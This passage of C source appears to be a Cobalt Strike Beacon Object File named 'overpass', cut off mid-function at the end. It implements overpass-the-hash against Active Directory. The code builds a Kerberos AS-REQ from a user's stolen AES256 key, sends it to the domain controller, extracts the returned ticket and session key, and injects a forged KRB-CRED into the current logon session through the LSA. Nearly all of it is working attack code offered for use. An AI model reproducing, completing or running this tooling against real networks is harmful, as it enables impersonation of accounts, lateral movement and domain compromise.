}

/* Read a TLV; returns start of value and value length.  Advances cursor past value. */
static int asn1r_tlv(asn1r_t* r, uint8_t* out_tag, const uint8_t** out_val, int* out_vlen)
{
    if (!asn1r_tag(r, out_tag)) return 0;
    if (!asn1r_length(r, out_vlen)) return 0;
    if (r->p + *out_vlen > r->end) return 0;
    *out_val = r->p;
    r->p += *out_vlen;
    return 1;
}

/* Read an unsigned INTEGER (up to 32-bit). */
static int asn1r_integer_u32(asn1r_t* r, uint32_t* out)
{
    uint8_t tag; const uint8_t* v; int vl;
    if (!asn1r_tlv(r, &tag, &v, &vl)) return 0;
    if (tag != 0x02) return 0;
    uint32_t x = 0;
    for (int i = 0; i < vl; i++) x = (x << 8) | v[i];
    *out = x;
    return 1;
}

/* ============================================================================
 *                            KERBEROS MESSAGE BUILD / PARSE
 * ============================================================================ */

static void current_kerberos_time(char out[16], uint32_t* out_usec_hint)
{
    FILETIME ft; SYSTEMTIME st;
    KERNEL32$GetSystemTimeAsFileTime(&ft);
    KERNEL32$FileTimeToSystemTime(&ft, &st);
    MSVCRT$_snprintf(out, 16, "%04d%02d%02d%02d%02d%02dZ",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    if (out_usec_hint) *out_usec_hint = (uint32_t)(st.wMilliseconds * 1000);
}

/* Build PA-ENC-TS-ENC ASN.1 (patimestamp + optional pausec), then encrypt with usage 1. */
static int build_paenc_ts(const uint8_t* aes256_key, uint8_t* out_pa, int cap, int* out_len)
{
    char ts[16]; uint32_t usec; current_kerberos_time(ts, &usec);

    /* Inner plaintext: PA-ENC-TS-ENC ::= SEQUENCE {
     *   patimestamp [0] KerberosTime,
     *   pausec      [1] Microseconds OPTIONAL  (0..999999)
     * } */
    uint8_t plain[64]; asn1w_t w; asn1w_init(&w, plain, sizeof(plain));
    uint8_t* end = plain + sizeof(plain);
    int before, after, len;
    /* pausec [1] INTEGER (optional) */
    before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, usec % 1000000);
    after = asn1w_used(&w, end);
    asn1w_wrap_ctx(&w, 1, after - before);
    /* patimestamp [0] GeneralizedTime */
    before = asn1w_used(&w, end);
    asn1w_generaltime(&w, ts);
    after = asn1w_used(&w, end);
    asn1w_wrap_ctx(&w, 0, after - before);
    /* SEQUENCE wrap */
    int seq_content = asn1w_used(&w, end);
    asn1w_wrap_seq(&w, seq_content);
    int plain_len = asn1w_used(&w, end);
    const uint8_t* plain_start = w.cur;

    /* Encrypt with AES256-CTS-HMAC-SHA1 usage 1. */
    uint8_t enc[256];
    int enc_len = 0;
    if (!kerb_encrypt(aes256_key, plain_start, plain_len, 1, enc, &enc_len)) return 0;
    if (enc_len + 32 > cap) return 0;

    /* Build EncryptedData ::= SEQUENCE {
     *   etype   [0] Int32,     -- 18 (aes256-cts-hmac-sha1-96)
     *   kvno    [1] UInt32 OPTIONAL,
     *   cipher  [2] OCTET STRING
     * } */
    asn1w_t ew; asn1w_init(&ew, out_pa, cap);
    uint8_t* eend = out_pa + cap;
    before = asn1w_used(&ew, eend);
    asn1w_octet(&ew, enc, enc_len);
    after = asn1w_used(&ew, eend);
    asn1w_wrap_ctx(&ew, 2, after - before);
    before = asn1w_used(&ew, eend);
    asn1w_integer_u32(&ew, 18);
    after = asn1w_used(&ew, eend);
    asn1w_wrap_ctx(&ew, 0, after - before);
    int seqlen = asn1w_used(&ew, eend);
    asn1w_wrap_seq(&ew, seqlen);
    int total = asn1w_used(&ew, eend);
    MSVCRT$memcpy(out_pa, ew.cur, (size_t)total);
    *out_len = total;
    return 1;
}

/* ============================================================================
 *                            SOCKET to KDC
 * ============================================================================ */

static int send_asreq_recv_asrep(const char* kdc_host, const uint8_t* asreq, int asreq_len,
                                 uint8_t** out_asrep, int* out_asrep_len)
{
    *out_asrep = NULL; *out_asrep_len = 0;
    WSADATA wd;
    if (WS2_32$WSAStartup(0x0202, &wd) != 0) return 0;

    ADDRINFOA hints; MSVCRT$memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    PADDRINFOA res = NULL;
    if (WS2_32$getaddrinfo(kdc_host, "88", &hints, &res) != 0 || !res) {
        WS2_32$WSACleanup();
        return 0;
    }
    SOCKET s = WS2_32$socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) { WS2_32$freeaddrinfo(res); WS2_32$WSACleanup(); return 0; }
    if (WS2_32$connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        WS2_32$closesocket(s); WS2_32$freeaddrinfo(res); WS2_32$WSACleanup();
        return 0;
    }
    WS2_32$freeaddrinfo(res);

    /* 4-byte big-endian length prefix. */
    uint8_t prefix[4];
    prefix[0] = (uint8_t)(asreq_len >> 24);
    prefix[1] = (uint8_t)(asreq_len >> 16);
    prefix[2] = (uint8_t)(asreq_len >> 8);
    prefix[3] = (uint8_t)(asreq_len);
    if (WS2_32$send(s, (const char*)prefix, 4, 0) != 4 ||
        WS2_32$send(s, (const char*)asreq, asreq_len, 0) != asreq_len) {
        WS2_32$closesocket(s); WS2_32$WSACleanup(); return 0;
    }
    /* Read response. */
    uint8_t lenbuf[4]; int total = 0;
    while (total < 4) {
        int r = WS2_32$recv(s, (char*)lenbuf + total, 4 - total, 0);
        if (r <= 0) { WS2_32$closesocket(s); WS2_32$WSACleanup(); return 0; }
        total += r;
    }
    int reply_len = (lenbuf[0] << 24) | (lenbuf[1] << 16) | (lenbuf[2] << 8) | lenbuf[3];
    if (reply_len <= 0 || reply_len > (1 << 20)) {
        WS2_32$closesocket(s); WS2_32$WSACleanup(); return 0;
    }
    uint8_t* reply = (uint8_t*)HEAP_ALLOC((SIZE_T)reply_len);
    if (!reply) { WS2_32$closesocket(s); WS2_32$WSACleanup(); return 0; }
    total = 0;
    while (total < reply_len) {
        int r = WS2_32$recv(s, (char*)reply + total, reply_len - total, 0);
        if (r <= 0) { HEAP_FREE(reply); WS2_32$closesocket(s); WS2_32$WSACleanup(); return 0; }
        total += r;
    }
    WS2_32$closesocket(s); WS2_32$WSACleanup();
    *out_asrep = reply;
    *out_asrep_len = reply_len;
    return 1;
}

/* ============================================================================
 *                            AS-REQ build / AS-REP parse / KRB-CRED build
 * ============================================================================ */

/* PrincipalName ::= SEQUENCE { name-type [0] Int32, name-string [1] SEQUENCE OF GeneralString } */
static int write_principal_v2(asn1w_t* w, uint8_t* end, int32_t name_type, const char* const* parts, int nparts)
{
    /* name-string [1] SEQUENCE OF GeneralString */
    int before = asn1w_used(w, end);
    for (int i = nparts - 1; i >= 0; i--) asn1w_generalstring(w, parts[i]);
    int inner = asn1w_used(w, end) - before;
    asn1w_wrap_seq(w, inner);
    int ns_total = asn1w_used(w, end) - before;
    asn1w_wrap_ctx(w, 1, ns_total);
    /* name-type [0] Int32 */
    int before2 = asn1w_used(w, end);
    asn1w_integer_u32(w, (uint32_t)name_type);
    int nt_total = asn1w_used(w, end) - before2;
    asn1w_wrap_ctx(w, 0, nt_total);
    /* Outer SEQUENCE */
    int seqc = asn1w_used(w, end) - before;
    asn1w_wrap_seq(w, seqc);
    return asn1w_used(w, end) - before;
}

/* Build full AS-REQ.  Return pointer to start inside buf and length. */
static int build_as_req(const char* user, const char* realm, const uint8_t* aes256,
                        uint8_t* buf, int cap, int* out_len, uint32_t* out_nonce)
{
    /* We assemble BACK-to-FRONT into buf. */
    asn1w_t w; asn1w_init(&w, buf, cap);
    uint8_t* end = buf + cap;

    /* ---- req-body ---- */
    /* etype [8] SEQUENCE OF Int32 — just 18 (aes256). */
    int before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 18);
    int inner = asn1w_used(&w, end) - before;
    asn1w_wrap_seq(&w, inner);
    int etype_total = asn1w_used(&w, end) - before;
    asn1w_wrap_ctx(&w, 8, etype_total);

    /* nonce [7] UInt32 */
    uint32_t nonce = 0;
    BCRYPT$BCryptGenRandom(NULL, (PUCHAR)&nonce, sizeof(nonce), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    nonce &= 0x7fffffff;
    before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, nonce);
    asn1w_wrap_ctx(&w, 7, asn1w_used(&w, end) - before);

    /* till [5] "20370913024805Z" (max renewable we won't ever actually use) */
    before = asn1w_used(&w, end);
    asn1w_generaltime(&w, "20370913024805Z");
    asn1w_wrap_ctx(&w, 5, asn1w_used(&w, end) - before);

    /* sname [3] PrincipalName:  krbtgt/<REALM> */
    before = asn1w_used(&w, end);
    const char* sn[2] = { "krbtgt", realm };
    write_principal_v2(&w, end, 2 /*NT-SRV-INST*/, sn, 2);
    asn1w_wrap_ctx(&w, 3, asn1w_used(&w, end) - before);

    /* realm [2] <REALM> */
    before = asn1w_used(&w, end);
    asn1w_generalstring(&w, realm);
    asn1w_wrap_ctx(&w, 2, asn1w_used(&w, end) - before);

    /* cname [1] PrincipalName: <user> */
    before = asn1w_used(&w, end);
    const char* cn[1] = { user };
    write_principal_v2(&w, end, 1 /*NT-PRINCIPAL*/, cn, 1);
    asn1w_wrap_ctx(&w, 1, asn1w_used(&w, end) - before);

    /* kdc-options [0] BIT STRING — forwardable + renewable + canonicalize.
     * Bit 1 (forwardable) = 0x40000000 BE32,  Bit 8 (renewable) = 0x00800000,  Bit 15 (canon) = 0x00010000.
     * As big-endian bytes: 0x40,0x81,0x00,0x00 */
    uint8_t opts[4] = { 0x40, 0x81, 0x00, 0x00 };
    before = asn1w_used(&w, end);
    asn1w_bitstring(&w, opts, 4);
    asn1w_wrap_ctx(&w, 0, asn1w_used(&w, end) - before);

    /* Wrap req-body in SEQUENCE */
    int body_content = asn1w_used(&w, end);
    asn1w_wrap_seq(&w, body_content);
    int reqbody_total = asn1w_used(&w, end);
    /* Wrap req-body in [4] */
    before = reqbody_total;
    asn1w_wrap_ctx(&w, 4, reqbody_total);
    int after_body = asn1w_used(&w, end);

    /* ---- padata [3] SEQUENCE OF PA-DATA ----
     * one PA-DATA entry: SEQUENCE {
     *   padata-type [1] Int32 (= 2 for ENC-TIMESTAMP),
     *   padata-value [2] OCTET STRING (EncryptedData bytes)
     * } */
    uint8_t paenc[512]; int paenc_len = 0;
    if (!build_paenc_ts(aes256, paenc, (int)sizeof(paenc), &paenc_len)) return 0;

    before = asn1w_used(&w, end);
    asn1w_octet(&w, paenc, paenc_len);
    asn1w_wrap_ctx(&w, 2, asn1w_used(&w, end) - before);
    before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 2);
    asn1w_wrap_ctx(&w, 1, asn1w_used(&w, end) - before);
    int pae_inner = asn1w_used(&w, end) - after_body;
    asn1w_wrap_seq(&w, pae_inner);
    int padata_entry = asn1w_used(&w, end) - after_body;
    asn1w_wrap_seq(&w, padata_entry);
    int padata_seq = asn1w_used(&w, end) - after_body;
    asn1w_wrap_ctx(&w, 3, padata_seq);

    /* msg-type [2] INTEGER 10 */
    before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 10);
    asn1w_wrap_ctx(&w, 2, asn1w_used(&w, end) - before);
    /* pvno [1] INTEGER 5 */
    before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 5);
    asn1w_wrap_ctx(&w, 1, asn1w_used(&w, end) - before);

    int kdc_req_content = asn1w_used(&w, end);
    asn1w_wrap_seq(&w, kdc_req_content);
    int wrapped = asn1w_used(&w, end);
    /* [APPLICATION 10] */
    asn1w_wrap_app(&w, 10, wrapped);

    int total = asn1w_used(&w, end);
    /* Shift to start of buf. */
    MSVCRT$memcpy(buf, w.cur, (size_t)total);
    *out_len = total;
    *out_nonce = nonce;
    return 1;
}

/* Parse AS-REP: locate the Ticket (raw [APPLICATION 1] blob) and the enc-part ciphertext. */
static int parse_as_rep(const uint8_t* reply, int reply_len,
                        const uint8_t** ticket_blob, int* ticket_blob_len,
                        const uint8_t** cipher, int* cipher_len)
{
    /* Expect [APPLICATION 11] (0x6B) OR KRB-ERROR [APPLICATION 30] (0x7E). */
    asn1r_t r; r.p = reply; r.end = reply + reply_len;
    uint8_t tag; const uint8_t* v; int vl;
    if (!asn1r_tlv(&r, &tag, &v, &vl)) return 0;
    if (tag != 0x6B) return -1;  /* likely a KRB-ERROR */

    /* Inside is SEQUENCE. */
    asn1r_t s; s.p = v; s.end = v + vl;
    if (!asn1r_tlv(&s, &tag, &v, &vl)) return 0;
    if (tag != 0x30) return 0;

    /* Walk the SEQUENCE fields and pick out [5] ticket and [6] enc-part. */
    asn1r_t f; f.p = v; f.end = v + vl;
    while (f.p < f.end) {
        uint8_t ftag; const uint8_t* fval; int flen;
        if (!asn1r_tlv(&f, &ftag, &fval, &flen)) return 0;
        if ((ftag & 0x1F) == 5 && (ftag & 0xE0) == 0xA0) {
            /* [5] contains the Ticket's full [APPLICATION 1] encoding. */
            *ticket_blob = fval;
            *ticket_blob_len = flen;
        } else if ((ftag & 0x1F) == 6 && (ftag & 0xE0) == 0xA0) {
            /* [6] EncryptedData — walk to its [2] cipher OCTET STRING. */
            asn1r_t e; e.p = fval; e.end = fval + flen;
            uint8_t et; const uint8_t* ev; int el;
            if (!asn1r_tlv(&e, &et, &ev, &el)) return 0;  /* outer SEQUENCE */
            if (et != 0x30) return 0;
            asn1r_t es; es.p = ev; es.end = ev + el;
            while (es.p < es.end) {
                uint8_t ct; const uint8_t* cv; int cl;
                if (!asn1r_tlv(&es, &ct, &cv, &cl)) return 0;
                if ((ct & 0x1F) == 2 && (ct & 0xE0) == 0xA0) {
                    /* [2] OCTET STRING */
                    asn1r_t os; os.p = cv; os.end = cv + cl;
                    uint8_t ot; const uint8_t* ovl; int ol;
                    if (!asn1r_tlv(&os, &ot, &ovl, &ol)) return 0;
                    if (ot != 0x04) return 0;
                    *cipher = ovl;
                    *cipher_len = ol;
                }
            }
        }
    }
    return (*ticket_blob && *cipher) ? 1 : 0;
}

/* Extract session key etype + key bytes from EncASRepPart plaintext.
 * EncASRepPart ::= [APPLICATION 25] SEQUENCE { key [0] EncryptionKey, ... }
 * EncryptionKey ::= SEQUENCE { keytype [0] Int32, keyvalue [1] OCTET STRING } */
static int extract_session_key(const uint8_t* enc_part, int enc_part_len,
                               int32_t* out_etype, uint8_t* out_key, int cap, int* out_key_len,
                               /* also capture top-level body range we'll re-emit */
                               const uint8_t** body_start, int* body_len)
{
    asn1r_t r; r.p = enc_part; r.end = enc_part + enc_part_len;
    uint8_t tag; const uint8_t* v; int vl;
    if (!asn1r_tlv(&r, &tag, &v, &vl)) return 0;
    /* Expect [APPLICATION 25] (0x79) or [APPLICATION 26] (0x7A). */
    if (tag != 0x79 && tag != 0x7A) return 0;
    *body_start = v;
    *body_len = vl;
    asn1r_t s; s.p = v; s.end = v + vl;
    if (!asn1r_tlv(&s, &tag, &v, &vl)) return 0;  /* outer SEQUENCE */
    if (tag != 0x30) return 0;
    asn1r_t f; f.p = v; f.end = v + vl;
    /* Find [0] key EncryptionKey */
    while (f.p < f.end) {
        uint8_t ft; const uint8_t* fv; int fl;
        if (!asn1r_tlv(&f, &ft, &fv, &fl)) return 0;
        if ((ft & 0x1F) == 0 && (ft & 0xE0) == 0xA0) {
            /* fv is the inner EncryptionKey SEQUENCE. */
            asn1r_t k; k.p = fv; k.end = fv + fl;
            uint8_t kt; const uint8_t* kv; int kl;
            if (!asn1r_tlv(&k, &kt, &kv, &kl)) return 0;  /* SEQUENCE */
            if (kt != 0x30) return 0;
            asn1r_t ks; ks.p = kv; ks.end = kv + kl;
            while (ks.p < ks.end) {
                uint8_t st2; const uint8_t* sv; int sl;
                if (!asn1r_tlv(&ks, &st2, &sv, &sl)) return 0;
                if ((st2 & 0x1F) == 0 && (st2 & 0xE0) == 0xA0) {
                    asn1r_t i; i.p = sv; i.end = sv + sl;
                    uint32_t et;
                    if (!asn1r_integer_u32(&i, &et)) return 0;
                    *out_etype = (int32_t)et;
                } else if ((st2 & 0x1F) == 1 && (st2 & 0xE0) == 0xA0) {
                    asn1r_t o; o.p = sv; o.end = sv + sl;
                    uint8_t ot; const uint8_t* ov; int ol;
                    if (!asn1r_tlv(&o, &ot, &ov, &ol)) return 0;
                    if (ot != 0x04 || ol > cap) return 0;
                    MSVCRT$memcpy(out_key, ov, (size_t)ol);
                    *out_key_len = ol;
                }
            }
            return 1;
        }
    }
    return 0;
}

/* Extract flags/times/srealm/sname from EncASRepPart body, re-emit as KrbCredInfo tags, write to out. */
static int reemit_krbcredinfo(const uint8_t* body, int body_len, const uint8_t* session_key, int skl,
                              int32_t etype, const char* client_realm, const char* client_user,
                              uint8_t* out, int cap, int* out_len)
{
    /* We walk the EncASRepPart's inner SEQUENCE (one level), copy field VALUES, re-tag per KrbCredInfo. */
    asn1r_t r; r.p = body; r.end = body + body_len;
    uint8_t tag; const uint8_t* v; int vl;
    if (!asn1r_tlv(&r, &tag, &v, &vl)) return 0;
    if (tag != 0x30) return 0;

    asn1w_t w; asn1w_init(&w, out, cap);
    uint8_t* end = out + cap;

    /* Collect field pointers from EncASRepPart.
     * EncKDCRepPart tags: 0 key, 1 last-req, 2 nonce, 3 key-exp, 4 flags, 5 authtime, 6 starttime,
     * 7 endtime, 8 renew-till, 9 srealm, 10 sname, 11 caddr. */
    const uint8_t *fv_flags = NULL, *fv_authtime = NULL, *fv_start = NULL, *fv_end = NULL, *fv_renew = NULL,
                  *fv_srealm = NULL, *fv_sname = NULL;
    int fl_flags = 0, fl_authtime = 0, fl_start = 0, fl_end = 0, fl_renew = 0, fl_srealm = 0, fl_sname = 0;

    asn1r_t f; f.p = v; f.end = v + vl;
    while (f.p < f.end) {
        uint8_t ft; const uint8_t* fval; int fll;
        if (!asn1r_tlv(&f, &ft, &fval, &fll)) return 0;
        int ctx = ft & 0x1F;
        if ((ft & 0xE0) != 0xA0) continue;
        if (ctx == 4) { fv_flags = fval; fl_flags = fll; }
        else if (ctx == 5) { fv_authtime = fval; fl_authtime = fll; }
        else if (ctx == 6) { fv_start = fval; fl_start = fll; }
        else if (ctx == 7) { fv_end = fval; fl_end = fll; }
        else if (ctx == 8) { fv_renew = fval; fl_renew = fll; }
        else if (ctx == 9) { fv_srealm = fval; fl_srealm = fll; }
        else if (ctx == 10) { fv_sname = fval; fl_sname = fll; }
    }

    /* Write KrbCredInfo (BACK-to-FRONT).  Field order per spec:
     * key(0) prealm(1) pname(2) flags(3) authtime(4) starttime(5) endtime(6) renew-till(7) srealm(8) sname(9). */
    int before, after;

    if (fv_sname && fl_sname) {
        before = asn1w_used(&w, end);
        asn1w_prepend(&w, fv_sname, fl_sname);
        asn1w_wrap_ctx(&w, 9, fl_sname);
        (void)before;
    }
    if (fv_srealm && fl_srealm) {
        asn1w_prepend(&w, fv_srealm, fl_srealm);
        asn1w_wrap_ctx(&w, 8, fl_srealm);
    }
    if (fv_renew && fl_renew) {
        asn1w_prepend(&w, fv_renew, fl_renew);
        asn1w_wrap_ctx(&w, 7, fl_renew);
    }
    if (fv_end && fl_end) {
        asn1w_prepend(&w, fv_end, fl_end);
        asn1w_wrap_ctx(&w, 6, fl_end);
    }
    if (fv_start && fl_start) {
        asn1w_prepend(&w, fv_start, fl_start);
        asn1w_wrap_ctx(&w, 5, fl_start);
    }
    /* KrbCredInfo authtime [4] intentionally omitted — Windows LSA rejects
     * KrbCredInfo carrying authtime (mimikatz/MakeMeEnterpriseAdmin omit it). */
    if (fv_flags && fl_flags) {
        asn1w_prepend(&w, fv_flags, fl_flags);
        asn1w_wrap_ctx(&w, 3, fl_flags);
    }

    /* pname [2]: NT-PRINCIPAL { client_user } */
    before = asn1w_used(&w, end);
    const char* cn[1] = { client_user };
    write_principal_v2(&w, end, 1, cn, 1);
    asn1w_wrap_ctx(&w, 2, asn1w_used(&w, end) - before);

    /* prealm [1] <client_realm> */
    before = asn1w_used(&w, end);
    asn1w_generalstring(&w, client_realm);
    asn1w_wrap_ctx(&w, 1, asn1w_used(&w, end) - before);

    /* key [0] EncryptionKey { keytype(0) keyvalue(1) } */
    before = asn1w_used(&w, end);
    /* keyvalue [1] */
    int kv_before = asn1w_used(&w, end);
    asn1w_octet(&w, session_key, skl);
    asn1w_wrap_ctx(&w, 1, asn1w_used(&w, end) - kv_before);
    /* keytype [0] */
    int kt_before = asn1w_used(&w, end);
    asn1w_integer_u32(&w, (uint32_t)etype);
    asn1w_wrap_ctx(&w, 0, asn1w_used(&w, end) - kt_before);
    int ek_seq = asn1w_used(&w, end) - before;
    asn1w_wrap_seq(&w, ek_seq);
    asn1w_wrap_ctx(&w, 0, asn1w_used(&w, end) - before);

    int seq_content = asn1w_used(&w, end);
    asn1w_wrap_seq(&w, seq_content);
    int total = asn1w_used(&w, end);
    MSVCRT$memcpy(out, w.cur, (size_t)total);
    *out_len = total;
    return 1;
}

/* Build KRB-CRED containing the ticket + KrbCredInfo. The enc-part uses NULL
 * encryption (etype 0) with the plaintext EncKrbCredPart embedded as the
 * cipher — the exact layout impacket-ticketConverter / mimikatz emit and what
 * KerbSubmitTicketMessage consumes. The session key rides in KrbCredInfo.key. */
static int build_krb_cred(const uint8_t* ticket_blob, int ticket_blob_len,
                          const uint8_t* kci, int kci_len,
                          uint8_t* out, int cap, int* out_len)
{
    asn1w_t w; asn1w_init(&w, out, cap);
    uint8_t* end = out + cap;

    /* ---- enc-part [3] EncryptedData (etype=0) ---- */
    int before = asn1w_used(&w, end);

    /* EncKrbCredPart ::= [APPLICATION 29] SEQUENCE { ticket-info [0] SEQUENCE OF KrbCredInfo } */
    asn1w_prepend(&w, kci, kci_len);
    asn1w_wrap_seq(&w, kci_len);                 /* SEQUENCE { KrbCredInfo } */
    int ti = asn1w_used(&w, end) - before;
    asn1w_wrap_ctx(&w, 0, ti);                   /* [0] ticket-info */
    int seqc = asn1w_used(&w, end) - before;
    asn1w_wrap_seq(&w, seqc);                    /* SEQUENCE { ticket-info } */
    int appc = asn1w_used(&w, end) - before;
    asn1w_wrap_app(&w, 29, appc);                /* [APPLICATION 29] */
    int plain_len = asn1w_used(&w, end) - before;

    /* cipher [2] = OCTET STRING { plaintext EncKrbCredPart } */
    asn1w_tlv_wrap(&w, 0x04, plain_len);
    int oct_total = asn1w_used(&w, end) - before;
    asn1w_wrap_ctx(&w, 2, oct_total);

    /* etype [0] = 0 */
    int before2 = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 0);
    asn1w_wrap_ctx(&w, 0, asn1w_used(&w, end) - before2);

    int ed_seq = asn1w_used(&w, end) - before;
    asn1w_wrap_seq(&w, ed_seq);                  /* SEQUENCE { etype, cipher } */
    int ep_content = asn1w_used(&w, end) - before;
    asn1w_wrap_ctx(&w, 3, ep_content);           /* [3] enc-part */
    int ep_total = asn1w_used(&w, end) - before; /* full [3] field incl. wrapper */

    /* tickets [2] SEQUENCE OF Ticket (one raw [APPLICATION 1] blob) */
    asn1w_prepend(&w, ticket_blob, ticket_blob_len);
    asn1w_wrap_seq(&w, ticket_blob_len);
    int ticks_total = asn1w_used(&w, end) - before - ep_total;
    asn1w_wrap_ctx(&w, 2, ticks_total);

    /* msg-type [1] 22 */
    before2 = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 22);
    asn1w_wrap_ctx(&w, 1, asn1w_used(&w, end) - before2);
    /* pvno [0] 5 */
    before2 = asn1w_used(&w, end);
    asn1w_integer_u32(&w, 5);
    asn1w_wrap_ctx(&w, 0, asn1w_used(&w, end) - before2);

    int seq_content = asn1w_used(&w, end);
    asn1w_wrap_seq(&w, seq_content);
    int app_wrapped = asn1w_used(&w, end);
    asn1w_wrap_app(&w, 22, app_wrapped);

    int total = asn1w_used(&w, end);
    MSVCRT$memcpy(out, w.cur, (size_t)total);
    *out_len = total;
    return 1;
}

/* ============================================================================
 *                            KerbSubmitTicketMessage
 * ============================================================================ */

typedef struct _KSUBMIT_LITE {
    ULONG MessageType;       /* 21 = KerbSubmitTicketMessage */
    LUID  LogonId;
    ULONG Flags;
    LONG  KeyType;
    ULONG KeyLength;
    ULONG KeyOffset;         /* KERB_CRYPTO_KEY32.Offset — bytes from struct start */
    ULONG KerbCredSize;
    ULONG KerbCredOffset;
} KSUBMIT_LITE;

/* KERB_SUBMIT_TKT_REQUEST is 36 bytes on both x86 and x64 — guard against
 * a Key field accidentally widening (e.g. back to a pointer on x64). */
static_assert(sizeof(KSUBMIT_LITE) == 36, "KSUBMIT_LITE layout mismatch");

static int submit_krb_cred_to_lsa(const uint8_t* krbcred, int krbcred_len)
{
    HANDLE hLsa = NULL;
    LSA_STRING pkg;
    ULONG authPkg = 0;
    const char* name = "Kerberos";
    pkg.Length = (USHORT)MSVCRT$strlen(name);
    pkg.MaximumLength = pkg.Length + 1;
    pkg.Buffer = (PCHAR)name;

    NTSTATUS st = SECUR32$LsaConnectUntrusted(&hLsa);
    if (st < 0 || !hLsa) return 0;
    st = SECUR32$LsaLookupAuthenticationPackage(hLsa, &pkg, &authPkg);
    if (st < 0) { SECUR32$LsaDeregisterLogonProcess(hLsa); return 0; }

    ULONG req_size = sizeof(KSUBMIT_LITE) + (ULONG)krbcred_len;
    KSUBMIT_LITE* req = (KSUBMIT_LITE*)HEAP_ALLOC(req_size);
    if (!req) { SECUR32$LsaDeregisterLogonProcess(hLsa); return 0; }
    req->MessageType = 21;   /* KerbSubmitTicketMessage */
    req->Flags = 0;
    req->KeyType = 0; req->KeyLength = 0; req->KeyOffset = 0;  /* NULL enc-part: no key */
    req->KerbCredSize = (ULONG)krbcred_len;
    req->KerbCredOffset = sizeof(KSUBMIT_LITE);
    /* LogonId 0 = current logon session (no SeTcbPrivilege required). */
    req->LogonId.LowPart = 0;
    req->LogonId.HighPart = 0;
    MSVCRT$memcpy((char*)req + req->KerbCredOffset, krbcred, (size_t)krbcred_len);

    NTSTATUS sub = 0;
    PVOID ob = NULL; ULONG ol = 0;
    st = SECUR32$LsaCallAuthenticationPackage(hLsa, authPkg, req, req_size, &ob, &ol, &sub);
    int ok = (st >= 0 && sub >= 0);
    if (!ok)
        BeaconPrintf(CALLBACK_ERROR, "overpass: LSA submit st=0x%08lx sub=0x%08lx", st, sub);
    if (ob) SECUR32$LsaFreeReturnBuffer(ob);
    HEAP_FREE(req);
    SECUR32$LsaDeregisterLogonProcess(hLsa);
    return ok;
}

/* ============================================================================
 *                            BOF entry
 * ============================================================================ */

static int hex_to_bytes(const char* hex, uint8_t* out, int max)
{
    int n = 0;
    while (hex[0] && hex[1] && n < max) {
        uint8_t hi = (uint8_t)((hex[0] >= 'a') ? (hex[0] - 'a' + 10) : (hex[0] >= 'A') ? (hex[0] - 'A' + 10) : (hex[0] - '0'));
        uint8_t lo = (uint8_t)((hex[1] >= 'a') ? (hex[1] - 'a' + 10) : (hex[1] >= 'A') ? (hex[1] - 'A' + 10) : (hex[1] - '0'));
        out[n++] = (uint8_t)((hi << 4) | lo);
        hex += 2;
    }
    return n;
}

/* Simple arg lookup — expects "/user:value" style args. */
static const char* find_arg(const char* key, char** argv, int argc)
{
    size_t klen = MSVCRT$strlen(key);
    for (int i = 0; i < argc; i++) {
        if (argv[i][0] != '/') continue;
        if (MSVCRT$memcmp(argv[i] + 1, key, klen) == 0 && argv[i][1 + klen] == ':') {
            return argv[i] + 1 + klen + 1;
        }
    }
    return NULL;
}

void go(char* buff, int len)
{
    /* Args packed as plain utf-8 string "...".  We tokenize on whitespace. */
    datap parser;
    BeaconDataParse(&parser, buff, len);
    char* args_blob = BeaconDataExtract(&parser, &len);
    if (!args_blob || len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: missing args. Usage: /user:X /domain:Y /aes256:HEX /dc:HOST");
        return;
    }

    /* Null-terminate and split on spaces. */
    char* work = (char*)HEAP_ALLOC((SIZE_T)(len + 1));
    if (!work) return;
    MSVCRT$memcpy(work, args_blob, (size_t)len);
    work[len] = 0;

    char* argv[16]; int argc = 0;
    char* p = work;
    while (*p && argc < 16) {
        while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
        if (!*p) break;
        argv[argc++] = p;
        while (*p && *p != ' ' && *p != '\t' && *p != '\n' && *p != '\r') p++;
        if (*p) *p++ = 0;
    }

    const char* user   = find_arg("user",   argv, argc);
    const char* domain = find_arg("domain", argv, argc);
    const char* aes    = find_arg("aes256", argv, argc);
    const char* dc     = find_arg("dc",     argv, argc);
    if (!dc) dc = find_arg("dc-ip", argv, argc);

    if (!user || !domain || !aes || !dc) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: /user, /domain, /aes256 and /dc are required");
        HEAP_FREE(work);
        return;
    }

    uint8_t key[AES256_KEY];
    if (hex_to_bytes(aes, key, AES256_KEY) != AES256_KEY) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: /aes256 must be 64 hex chars");
        HEAP_FREE(work);
        return;
    }

    /* Uppercase a copy of the realm for Kerberos (REALM-NAME is case-sensitive). */
    char realm[256]; MSVCRT$memset(realm, 0, sizeof(realm));
    for (int i = 0; domain[i] && i < 255; i++) {
        char c = domain[i];
        if (c >= 'a' && c <= 'z') c = (char)(c - 'a' + 'A');
        realm[i] = c;
    }

    bof_printf("overpass: AS-REQ for %s (%s) via KDC %s\n", user, realm, dc);

    uint8_t* buf = (uint8_t*)HEAP_ALLOC(2048); int as_req_len = 0; uint32_t nonce = 0;
    if (!buf) { HEAP_FREE(work); return; }
    if (!build_as_req(user, realm, key, buf, 2048, &as_req_len, &nonce)) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: AS-REQ build failed");
        HEAP_FREE(buf); HEAP_FREE(work); return;
    }

    uint8_t* as_rep = NULL; int as_rep_len = 0;
    if (!send_asreq_recv_asrep(dc, buf, as_req_len, &as_rep, &as_rep_len)) {
        HEAP_FREE(buf);
        BeaconPrintf(CALLBACK_ERROR, "overpass: AS-REQ transport failed (DNS/TCP:88?)");
